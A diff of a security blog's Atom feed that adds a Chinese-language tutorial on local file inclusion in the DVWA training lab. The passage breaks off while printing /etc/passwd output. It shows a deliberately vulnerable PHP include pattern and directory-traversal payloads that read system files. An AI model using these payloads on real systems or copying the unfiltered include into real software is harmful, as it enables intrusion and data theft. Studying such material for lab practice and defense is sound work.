@@ -3,49 +3,302 @@
     <id>https://bae-ace.github.io</id>
     <title>bae的博客 • Posts by &#34;web安全&#34; tag</title>
     <link href="https://bae-ace.github.io" />
-    <updated>2025-08-06T13:43:58.000Z</updated>
+    <updated>2025-08-07T11:03:45.000Z</updated>
     <category term="Web安全" />
     <category term="Solr" />
     <category term="XXE" />
     <category term="漏洞复现" />
     <category term="Vulhub" />
     <category term="Kali" />
+    <category term="文件上传" />
+    <category term="RCE" />
+    <category term="Nginx" />
+    <category term="PHP-FPM" />
+    <category term="蚁剑" />
     <category term="PWN" />
     <category term="ELF" />
     <category term="ROP" />
     <category term="CTF" />
     <category term="二进制安全" />
-    <category term="PHP" />
-    <category term="SSRF" />
     <category term="Struts2" />
-    <category term="RCE" />
     <category term="OGNL注入" />
-    <category term="文件上传" />
-    <category term="Nginx" />
-    <category term="PHP-FPM" />
-    <category term="蚁剑" />
     <category term="权限绕过" />
     <category term="水平越权" />
     <category term="垂e直越权" />
     <category term="Pikachu靶场" />
-    <category term="SQL注入" />
-    <category term="渗透测试" />
-    <category term="网络安全" />
     <category term="工具" />
     <category term="sqlmap" />
+    <category term="渗透测试" />
+    <category term="SQL注入" />
+    <category term="网络安全" />
     <category term="ThinkPHP" />
-    <category term="hexo" />
-    <category term="博客搭建" />
-    <category term="初始测试" />
+    <category term="PHP" />
+    <category term="SSRF" />
     <category term="WebShell" />
     <category term="冰蝎" />
     <category term="漏洞利用" />
+    <category term="hexo" />
+    <category term="博客搭建" />
+    <category term="初始测试" />
     <category term="linux" />
     <category term="命令" />
     <category term="命令执行" />
     <category term="LFI" />
     <category term="信息收集" />
     <category term="子域名" />
+    <category term="DVWA" />
+    <category term="安全防护" />
+    <entry>
+        <id>https://bae-ace.github.io/2025/08/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A%E5%9F%BA%E4%BA%8E-DVWA-%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
+        <title>本地文件包含（LFI）漏洞详解：基于 DVWA 的原理与利用</title>
+        <link rel="alternate" href="https://bae-ace.github.io/2025/08/07/%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88LFI%EF%BC%89%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%EF%BC%9A%E5%9F%BA%E4%BA%8E-DVWA-%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
+        <content type="html">&lt;h1 id=&#34;本地文件包含（LFI）漏洞详解：基于-DVWA-的原理与利用&#34;&gt;&lt;a href=&#34;#本地文件包含（LFI）漏洞详解：基于-DVWA-的原理与利用&#34; class=&#34;headerlink&#34; title=&#34;本地文件包含（LFI）漏洞详解：基于 DVWA 的原理与利用&#34;&gt;&lt;/a&gt;本地文件包含（LFI）漏洞详解：基于 DVWA 的原理与利用&lt;/h1&gt;&lt;h2 id=&#34;一、前言&#34;&gt;&lt;a href=&#34;#一、前言&#34; class=&#34;headerlink&#34; title=&#34;一、前言&#34;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;本地文件包含（LFI，Local File Inclusion）&lt;/strong&gt; 是一种常见的 Web 安全漏洞，攻击者通过控制动态包含的文件路径，读取服务器上的敏感文件，甚至结合其他漏洞（如文件上传）实现远程代码执行（RCE）。本文基于 &lt;strong&gt;DVWA（Damn Vulnerable Web Application）&lt;/strong&gt; 靶场的 LFI 模块，详细剖析 LFI 漏洞的原理、代码结构、利用方式、绕过技巧及防护措施，旨在帮助安全从业者和开发者深入理解 LFI 漏洞的成因与防范方法。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;学习目标&lt;/strong&gt;：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;掌握 LFI 漏洞的触发原理和代码缺陷&lt;/li&gt;
+&lt;li&gt;学会利用 DVWA 复现 LFI 漏洞&lt;/li&gt;
+&lt;li&gt;理解 LFI 的绕过技巧（如编码、日志包含）&lt;/li&gt;
+&lt;li&gt;掌握防御 LFI 漏洞的最佳实践&lt;/li&gt;
+&lt;/ul&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;免责声明&lt;/strong&gt;：本文内容仅限合法授权的渗透测试和安全研究，严禁用于非法攻击！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;二、漏洞原理分析&#34;&gt;&lt;a href=&#34;#二、漏洞原理分析&#34; class=&#34;headerlink&#34; title=&#34;二、漏洞原理分析&#34;&gt;&lt;/a&gt;二、漏洞原理分析&lt;/h2&gt;&lt;h3 id=&#34;1-LFI-漏洞定义&#34;&gt;&lt;a href=&#34;#1-LFI-漏洞定义&#34; class=&#34;headerlink&#34; title=&#34;1. LFI 漏洞定义&#34;&gt;&lt;/a&gt;1. LFI 漏洞定义&lt;/h3&gt;&lt;p&gt;LFI 漏洞是指 Web 应用在动态包含文件（如 PHP 的 &lt;code&gt;include&lt;/code&gt; 或 &lt;code&gt;require&lt;/code&gt;）时，未对用户输入的参数进行严格过滤，允许攻击者指定任意本地文件路径，导致敏感文件泄露或代码执行。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;典型代码&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;p&gt;&lt;strong&gt;攻击示例&lt;/strong&gt;：&lt;/p&gt;
+&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;target.com&lt;span class=&#34;hljs-regexp&#34;&gt;/index.php?page=../&lt;/span&gt;..&lt;span class=&#34;hljs-regexp&#34;&gt;/../&lt;/span&gt;..&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;passwd&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;ul&gt;
+&lt;li&gt;攻击者通过 &lt;code&gt;page&lt;/code&gt; 参数控制包含路径，读取 &lt;code&gt;/etc/passwd&lt;/code&gt; 等敏感文件。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-危害&#34;&gt;&lt;a href=&#34;#2-危害&#34; class=&#34;headerlink&#34; title=&#34;2. 危害&#34;&gt;&lt;/a&gt;2. 危害&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;信息泄露&lt;/strong&gt;：读取配置文件、系统文件（如 &lt;code&gt;/etc/passwd&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;代码执行&lt;/strong&gt;：结合文件上传或日志注入，执行恶意代码。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;服务器接管&lt;/strong&gt;：配合反弹 Shell 或 WebShell 实现 RCE。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;3-DVWA-代码分析&#34;&gt;&lt;a href=&#34;#3-DVWA-代码分析&#34; class=&#34;headerlink&#34; title=&#34;3. DVWA 代码分析&#34;&gt;&lt;/a&gt;3. DVWA 代码分析&lt;/h3&gt;&lt;p&gt;以下是 DVWA LFI 模块的简化代码（&lt;code&gt;vulnerabilities/fi/source/index.php&lt;/code&gt;）：&lt;/p&gt;
+&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 获取要包含的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt; = &lt;span class=&#34;hljs-variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;page&amp;#x27;&lt;/span&gt;];&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;switch&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$vuln_level&lt;/span&gt;) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;low&amp;#x27;&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$vulnerabilityFile&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;low.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;medium&amp;#x27;&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$vulnerabilityFile&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;medium.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;high&amp;#x27;&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$vulnerabilityFile&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;high.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;default&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-variable&#34;&gt;$vulnerabilityFile&lt;/span&gt; = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;impossible.php&amp;#x27;&lt;/span&gt;;&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 包含对应等级的文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;require_once&lt;/span&gt; DVWA_WEB_PAGE_TO_ROOT . &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;vulnerabilities/fi/source/&amp;#x27;&lt;/span&gt; . &lt;span class=&#34;hljs-variable&#34;&gt;$vulnerabilityFile&lt;/span&gt;;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 实际包含用户输入文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;)) &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;include&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$file&lt;/span&gt;);&lt;br&gt;&amp;#125; &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;br&gt;    &lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;header&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Location: ?page=include.php&amp;quot;&lt;/span&gt;);&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;exit&lt;/span&gt;;&lt;br&gt;&amp;#125;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-comment&#34;&gt;// 输出页面&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-title function_ invoke__&#34;&gt;dvwaHtmlEcho&lt;/span&gt;(&lt;span class=&#34;hljs-variable&#34;&gt;$page&lt;/span&gt;);&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+
+&lt;h4 id=&#34;代码问题&#34;&gt;&lt;a href=&#34;#代码问题&#34; class=&#34;headerlink&#34; title=&#34;代码问题&#34;&gt;&lt;/a&gt;代码问题&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;变量 &lt;code&gt;$file&lt;/code&gt;&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;直接来自 &lt;code&gt;$_GET[&amp;#39;page&amp;#39;]&lt;/code&gt;，未经过任何过滤。&lt;/li&gt;
+&lt;li&gt;通过 &lt;code&gt;include($file)&lt;/code&gt; 动态包含，允许攻击者控制文件路径。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;缺乏校验&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;未限制 &lt;code&gt;$file&lt;/code&gt; 的路径范围，可能导致目录穿越（如 &lt;code&gt;../../../../etc/passwd&lt;/code&gt;）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;不同安全等级&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;low.php&lt;/code&gt;：无任何过滤，直接包含。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;medium.php&lt;/code&gt;：可能添加部分过滤（如移除 &lt;code&gt;../&lt;/code&gt;），但可绕过。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;high.php&lt;/code&gt;：加强过滤，但仍可能存在漏洞。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;impossible.php&lt;/code&gt;：使用白名单机制，较为安全。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;三、靶场环境搭建&#34;&gt;&lt;a href=&#34;#三、靶场环境搭建&#34; class=&#34;headerlink&#34; title=&#34;三、靶场环境搭建&#34;&gt;&lt;/a&gt;三、靶场环境搭建&lt;/h2&gt;&lt;h3 id=&#34;1-环境信息&#34;&gt;&lt;a href=&#34;#1-环境信息&#34; class=&#34;headerlink&#34; title=&#34;1. 环境信息&#34;&gt;&lt;/a&gt;1. 环境信息&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;操作系统&lt;/strong&gt;：Kali Linux（虚拟机，推荐 4GB 内存，2 核 CPU）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;靶场&lt;/strong&gt;：DVWA&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;工具&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;Burp Suite（抓包与请求修改）&lt;/li&gt;
+&lt;li&gt;蚁剑（WebShell 管理，结合文件上传）&lt;/li&gt;
+&lt;li&gt;Firefox（测试请求）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;靶站地址&lt;/strong&gt;：&lt;code&gt;http://localhost/dvwa&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;2-DVWA-安装&#34;&gt;&lt;a href=&#34;#2-DVWA-安装&#34; class=&#34;headerlink&#34; title=&#34;2. DVWA 安装&#34;&gt;&lt;/a&gt;2. DVWA 安装&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;下载 DVWA&lt;/strong&gt;：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;git &lt;span class=&#34;hljs-built_in&#34;&gt;clone&lt;/span&gt; https://github.com/digininja/DVWA.git&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;cd&lt;/span&gt; DVWA&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;配置环境&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;将 DVWA 目录复制到 Web 根目录（如 &lt;code&gt;/var/www/html/&lt;/code&gt;）：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;cp&lt;/span&gt; -r DVWA /var/www/html/dvwa&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;配置 Nginx 或 Apache，以及 PHP 和 MySQL。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;修改配置文件&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;编辑 &lt;code&gt;config/config.inc.php&lt;/code&gt;：&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs php&#34;&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_server&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;localhost&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_database&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;dvwa&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_user&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;root&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;span class=&#34;hljs-variable&#34;&gt;$_DVWA&lt;/span&gt;[&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;db_password&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;your_password&amp;#x27;&lt;/span&gt;;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;启动服务&lt;/strong&gt;：&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; service apache2 start&lt;br&gt;&lt;span class=&#34;hljs-built_in&#34;&gt;sudo&lt;/span&gt; service mysql start&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;访问靶场&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;访问 &lt;code&gt;http://localhost/dvwa&lt;/code&gt;，完成安装。&lt;/li&gt;
+&lt;li&gt;默认用户：&lt;code&gt;admin&lt;/code&gt; &amp;#x2F; &lt;code&gt;password&lt;/code&gt;。&lt;/li&gt;
+&lt;li&gt;设置安全等级：&lt;code&gt;Low&lt;/code&gt;（便于测试）。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;四、漏洞利用方式&#34;&gt;&lt;a href=&#34;#四、漏洞利用方式&#34; class=&#34;headerlink&#34; title=&#34;四、漏洞利用方式&#34;&gt;&lt;/a&gt;四、漏洞利用方式&lt;/h2&gt;&lt;h3 id=&#34;1-读取系统文件&#34;&gt;&lt;a href=&#34;#1-读取系统文件&#34; class=&#34;headerlink&#34; title=&#34;1. 读取系统文件&#34;&gt;&lt;/a&gt;1. 读取系统文件&lt;/h3&gt;&lt;h4 id=&#34;步骤&#34;&gt;&lt;a href=&#34;#步骤&#34; class=&#34;headerlink&#34; title=&#34;步骤&#34;&gt;&lt;/a&gt;步骤&lt;/h4&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;构造 Payload&lt;/strong&gt;：&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;http:&lt;span class=&#34;hljs-regexp&#34;&gt;//&lt;/span&gt;localhost&lt;span class=&#34;hljs-regexp&#34;&gt;/dvwa/&lt;/span&gt;vulnerabilities&lt;span class=&#34;hljs-regexp&#34;&gt;/fi/&lt;/span&gt;?page=..&lt;span class=&#34;hljs-regexp&#34;&gt;/../&lt;/span&gt;..&lt;span class=&#34;hljs-regexp&#34;&gt;/../&lt;/span&gt;etc/passwd&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;发送请求&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;使用 Firefox 或 Burp Suite 访问。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;结果&lt;/strong&gt;：&lt;ul&gt;
+&lt;li&gt;页面返回 &lt;code&gt;/etc/passwd&lt;/code&gt; 内容，如：&lt;figure class=&#34;highlight elixir&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs elixir&#34;&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;root:&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;x:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:root&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:/root&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;daemon:&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;x:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-symbol&#34;&gt;:daemon&lt;/span&gt;&lt;span 